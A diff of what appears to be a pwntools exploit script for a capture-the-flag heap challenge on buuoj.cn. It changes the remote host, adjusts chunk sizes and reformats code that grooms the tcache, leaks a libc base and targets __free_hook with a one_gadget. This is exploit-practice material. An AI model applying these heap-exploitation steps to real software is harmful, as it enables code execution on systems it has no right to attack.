@@ -20,7 +20,7 @@ if not f_remote:
     #io = process(vuln_path)
     io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
 else:
-    io = remote("node4.buuoj.cn", 26135)
+    io = remote("node5.buuoj.cn", 27704)
 
 
 def ddebug(b=""):
@@ -62,7 +62,7 @@ for i in range(1, 8):
     free(i)
 free(0)
 
-add(0x8, b"a"*8)
+add(0x8, b"a" * 8)
 show(0)
 libc.address = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x3ebd20
 success("libcbase -> " + hex(libc.address))
@@ -71,14 +71,14 @@ free_hook = libc.symbols["__free_hook"]
 one_gadget = libc.address + 0x4f322
 
 add(0x60, "a")
-add(0x30, "a"*0x30)  # 2
-add(0x38, "a"*0x38)  # 3
-add(0x100, "b")  # 4
-add(0x88, "b")  # 5
-add(0x20, "b")  # 6
-add(0x20, "b")  # 7
-add(0x20, "b")  # 8
-add(0x20, "b")  # 9
+add(0x30, "a" * 0x30) # 2
+add(0x38, "a" * 0x38) # 3
+add(0x100, "b") # 4
+add(0x68, "b") # 5
+add(0x20, "b") # 6
+add(0x20, "b") # 7
+add(0x20, "b") # 8
+add(0x20, "b") # 9
 
 free(5)
 free(7)
